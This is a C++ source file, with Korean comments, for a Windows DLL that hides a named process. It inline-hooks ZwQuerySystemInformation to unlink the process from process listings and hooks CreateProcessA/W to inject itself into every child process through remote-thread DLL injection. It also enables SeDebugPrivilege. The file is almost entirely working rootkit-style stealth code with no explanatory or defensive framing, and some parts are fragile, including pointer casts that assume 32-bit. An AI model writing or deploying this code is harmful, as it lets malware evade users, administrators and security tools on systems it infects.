/*****************************************************
*	해당 프로그램(exe,dll)은 지정한 프로세스를 
*	다른 프로세스로부터 숨긴다.(Hide)
*****************************************************/

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string.h>
#include <tchar.h>
#include <stdlib.h>

#define STR_MODULE_NAME					    "DllInjection_dll.dll"
#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37, SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 PULONG ReturnLength);

typedef BOOL(WINAPI *PFCREATEPROCESSA)(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI *PFCREATEPROCESSW)(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

// global variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
	char g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// global variable
BYTE g_pOrgCPA[5] = { 0, };
BYTE g_pOrgCPW[5] = { 0, };
BYTE g_pOrgZwQSI[5] = { 0, };

DWORD convert_unicode_to_ansi_string(
	__out std::string& ansi,
	__in const wchar_t* unicode,
	__in const size_t unicode_size
) {
	DWORD error = 0;
	do {
		if ((nullptr == unicode) || (0 == unicode_size)) {
			error = ERROR_INVALID_PARAMETER;
			break;
		}
		ansi.clear();
		//
		// getting required cch.
		//
		int required_cch = ::WideCharToMultiByte(
			CP_ACP,
			0,
			unicode,
			/*static_cast<int>(unicode_size)*/-1,
			nullptr, 0,
			nullptr, nullptr
		);
		if (0 == required_cch) {
			error = ::GetLastError();
			break;
		}
		//
		// allocate.
		//
		ansi.resize(required_cch);
		//
		// convert.
		//
		if (0 == ::WideCharToMultiByte(
			CP_ACP,
			0,
			unicode,
			/*static_cast<int>(unicode_size)*/-1,
			const_cast<char*>(ansi.c_str()), static_cast<int>(ansi.size()),
			nullptr, nullptr
		)) {
			error = ::GetLastError();
			break;
		}
	} while (false);
	return error;
}

BOOL hook_by_code(
	const wchar_t* szDllName, 
	const char* szFuncName, 
	PROC pfnNew, 
	PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	// 후킹 대상 API 주소를 구한다
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	// 만약 이미 후킹 되어 있다면 return FALSE
	if (pByte[0] == 0xE9)
		return FALSE;

	// 5 byte 패치를 위하여 메모리에 WRITE 속성 추가
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 기존 코드 (5 byte) 백업
	memcpy(pOrgBytes, pfnOrg, 5);

	// JMP 주소 계산 (E9 XXXX)
	// => XXXX = pfnNew - pfnOrg - 5
	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	// Hook - 5 byte 패치 (JMP XXXX)
	memcpy(pfnOrg, pBuf, 5);

	// 메모리 속성 복원
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(
	const TCHAR* szDllName, 
	const char* szFuncName, 
	PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;

	// API 주소 구한다
	pFunc = GetProcAddress(GetModuleHandle(szDllName), szFuncName);

	// 원래 코드(5 byte)를 덮어쓰기 위해 메모리에 WRITE 속성 추가
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// Unhook
	memcpy(pFunc, pOrgBytes, 5);

	// 메모리 속성 복원
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

bool 
InjectDll(
	_In_ HANDLE hProcess, 
	_In_ LPCTSTR szDllName)
{
	HANDLE hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = lstrlen(szDllName) + 1;
	FARPROC pThreadProc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,
								MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteBuf == NULL)
		return false;

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,
					   dwBufSize, NULL);

	pThreadProc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")),
								 "LoadLibraryA");
	hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)pThreadProc,
								 pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);

	return true;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur = nullptr, pPrev = nullptr;
	char szProcName[MAX_PATH] = { 0, };

	unhook_by_code(_T("ntdll.dll"), 
				   "ZwQuerySystemInformation", 
				   g_pOrgZwQSI);

	pFunc = GetProcAddress(GetModuleHandle(_T("ntdll.dll")),
						   "ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
		 SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1], -1,
								szProcName, MAX_PATH, NULL, NULL);

			if (!_strcmpi(szProcName, g_szProcName))
			{
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;	// 원하는 프로세스를 못 찾은 경우만 pPrev 세팅

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	hook_by_code(_T("ntdll.dll"), 
				 "ZwQuerySystemInformation",
				 (PROC)NewZwQuerySystemInformation, 
				 g_pOrgZwQSI);

	return status;
}

BOOL WINAPI NewCreateProcessA(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;

	// unhook
	unhook_by_code(_T("kernel32.dll"), 
				   "CreateProcessA", 
				   g_pOrgCPA);

	// original API 호출
	pFunc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "CreateProcessA");
	bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
									 lpCommandLine,
									 lpProcessAttributes,
									 lpThreadAttributes,
									 bInheritHandles,
									 dwCreationFlags,
									 lpEnvironment,
									 lpCurrentDirectory,
									 lpStartupInfo,
									 lpProcessInformation);

	// 생성된 자식 프로세스에 stealth2.dll 을 인젝션 시킴
	if (bRet)
		InjectDll(lpProcessInformation->hProcess, _T(STR_MODULE_NAME));

	// hook
	hook_by_code(_T("kernel32.dll"), 
				 "CreateProcessA",
				 (PROC)NewCreateProcessA, 
				 g_pOrgCPA);

	return bRet;
}

BOOL WINAPI NewCreateProcessW(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;

	// unhook
	unhook_by_code(_T("kernel32.dll"), "CreateProcessW", g_pOrgCPW);

	// original API 호출
	pFunc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "CreateProcessW");
	bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
									 lpCommandLine,
									 lpProcessAttributes,
									 lpThreadAttributes,
									 bInheritHandles,
									 dwCreationFlags,
									 lpEnvironment,
									 lpCurrentDirectory,
									 lpStartupInfo,
									 lpProcessInformation);

	if (bRet)
		InjectDll(lpProcessInformation->hProcess, _T(STR_MODULE_NAME));

	// hook
	hook_by_code(_T("kernel32.dll"), 
				 "CreateProcessW",
				 (PROC)NewCreateProcessW, 
				 g_pOrgCPW);

	return bRet;
}

bool SetPrivilege(
	_In_ LPCTSTR lpszPrivilege, 
	_In_ bool bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
						  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
						  &hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,             // lookup privilege on local system
							  lpszPrivilege,    // privilege to lookup 
							  &luid))          // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
							   FALSE,
							   &tp,
							   sizeof(TOKEN_PRIVILEGES),
							   (PTOKEN_PRIVILEGES)NULL,
							   (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

BOOL
APIENTRY DllMain(HMODULE hModule,
				 DWORD  ul_reason_for_call,
				 LPVOID lpReserved
)
{
	SetPrivilege(SE_DEBUG_NAME, true);

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		hook_by_code(_T("kernel32.dll"), 
					 "CreateProcessA",
					 (PROC)NewCreateProcessA, 
					 g_pOrgCPA);

		hook_by_code(_T("kernel32.dll"), 
					 "CreateProcessW",
					 (PROC)NewCreateProcessW, 
					 g_pOrgCPW);

		hook_by_code(_T("ntdll.dll"), 
					 "ZwQuerySystemInformation",
					 (PROC)NewZwQuerySystemInformation, 
					 g_pOrgZwQSI);
		break;
    case DLL_PROCESS_DETACH:
		unhook_by_code(_T("kernel32.dll"), 
					   "CreateProcessA",
					   g_pOrgCPA);

		unhook_by_code(_T("kernel32.dll"), 
					   "CreateProcessW",
					   g_pOrgCPW);
		unhook_by_code(_T("ntdll.dll"), 
					   "ZwQuerySystemInformation",
					   g_pOrgZwQSI);
        break;
    }
    return TRUE;
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(const char* szProcName)
	{
		strcpy_s(g_szProcName, _countof(g_szProcName),szProcName);
	}
#ifdef __cplusplus
}
#endif